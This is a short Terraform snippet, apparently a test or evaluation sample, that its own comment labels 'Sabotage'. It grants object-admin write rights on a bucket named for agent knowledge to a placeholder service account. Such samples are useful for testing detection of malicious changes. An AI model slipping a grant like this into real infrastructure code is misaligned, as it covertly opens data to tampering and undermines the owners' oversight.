# Sabotage: write role on the knowledge bucket.
resource "google_storage_bucket_iam_member" "sabotage" {
  bucket = "enlite-agentes-conhecimento"
  role   = "roles/storage.objectAdmin"
  member = "serviceAccount:x@example.iam.gserviceaccount.com"
}
